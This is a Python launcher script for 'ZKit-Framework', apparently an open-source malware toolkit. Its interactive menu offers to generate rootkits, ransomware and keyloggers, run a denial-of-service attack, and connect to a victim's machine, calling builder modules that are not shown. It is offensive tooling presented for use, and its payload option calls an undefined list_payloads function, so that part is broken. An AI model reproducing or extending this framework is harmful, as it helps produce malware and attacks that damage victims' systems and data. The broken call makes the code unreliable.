"ZKit-Framework Github : https://github.com/000Zer000/ZKit-Framework"
# Copyright (c) 2020, Zer0 . All rights reserved.
# This Work Is Licensed Under Apache Software License 2.0 More
# Can Be Found In The LICENSE File.
__author__ = "Zer0"
__version__ = "1.4.5"
__license__ = "Apache Software License 2.0"
__status__ = "Production"
import os
from datetime import datetime as dt
import sys


def start():
    "Starts zkit with those beautiful menues"
    try:
        try:
            # Doing some imports
            from core.helper_core import notify, Color, Generate, dos, \
                ctrler, helpbanner, init, print_banner, list_builtin_payloads, search_for_payloads, crash_handler
        except (ImportError, ModuleNotFoundError) as value:
            # Ops ! Sth is missing

            print(
                "One Or Some On Requirments Not Found . Please Install Them And Try Again ."
                + "Python Threw : "
                + str(value)
            )
            raise
        # Printing A Banner More Coming Soon
        _, red, green, yellow, blue, magenta, cyan, _, reset = Color().GetAllColors()
        init()
        print_banner()
        # Hard And Boring Code
        print(
            "\t " * 5 + "Hacking is" + red + " C " + green + "O " + blue + "L " +
            yellow + "O " + magenta + "R " + green +
            "F " + red + "U " + magenta + "L " + reset
        )
        print(
            "Available Options Are or Enter '?' To get a summery about notes of using this framework:\n"
            + red + "  {1} --> Create A RootKit\n"
            + green + "  {2} --> Create A Ransomware (Beta)\n"
            + blue + "  {3} --> Create A KeyLogger \n"
            + yellow + "  {4} --> Run A Dos Attack\n"
            + magenta + "  {5} --> Connect To A Victim\n"
            + red + "  {6} --> Generate Your User Payloads\n"
            + cyan + "  {000}" + "--> Exit ZKit-Framework\n" + reset
        )
        while True:
            try:
                choice = str(input("..> "))

                if choice == "000":
                    break
                if choice == "?":
                    print(helpbanner)
                elif choice == "1":
                    payloads = list_builtin_payloads('rootkit')
                    index = input("")
                    Generate(list(payloads.values())[int(index) - 1])

                elif choice == "2":
                    print(
                        "This Feature (Ransomware) is beta and have not tested . continue anyway ? (Y/N) : ", end="")
                    agreed = True if str(
                        input("")).lower().strip() == "y" else False
                    if agreed:
                        payloads = list_builtin_payloads('ransomware')
                        index = input("")
                        Generate(list(payloads.values())[int(index) - 1])
                    else:
                        print("Ignoring . Back To Main Menu.")
                elif choice == "3":
                    payloads = list_builtin_payloads('keylogger')
                    index = input("")
                    Generate(list(payloads.values())[int(index) - 1])

                elif choice == "4":
                    dos.main()
                elif choice == "5":
                    ctrler.Main()
                elif choice == "6":
                    payloads = list_payloads()
                    if len(payloads) == 0:
                        print(
                            "No User Payload Was Found . Please Download one from zkit-market or make one using zkit-payload-template")
                    else:
                        print("Please Choose One Of Them (Number Of It): ", end="")
                    index = input("")
                    Generate(list(payloads.values())[int(index) - 1])
                elif choice is not None:
                    notify(
                        "problem", "Invalid Input {" + "{}".format(choice) + "}")
            except (KeyboardInterrupt, EOFError):
                print("\nPlease Type '000' To Exit ZKit-Framework\n")
                choice = None
    except BaseException as e:
        crash_handler(e)


start()
